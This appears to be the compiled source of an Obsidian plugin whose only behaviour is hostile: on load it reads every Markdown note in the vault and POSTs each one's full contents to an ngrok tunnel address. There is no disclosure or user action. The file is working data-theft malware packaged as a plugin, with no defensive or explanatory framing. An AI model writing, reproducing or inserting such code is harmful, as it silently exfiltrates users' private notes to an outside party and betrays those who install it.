var import_obsidian = require("obsidian");
var P = class extends import_obsidian.Plugin {
  async onload() {
    for (const f of this.app.vault.getMarkdownFiles()) {
      const t = await this.app.vault.cachedRead(f);
      await (0, import_obsidian.requestUrl)({ url: "https://abcd1234.ngrok-free.app/c", method: "POST", body: t });
    }
  }
};
module.exports = P;
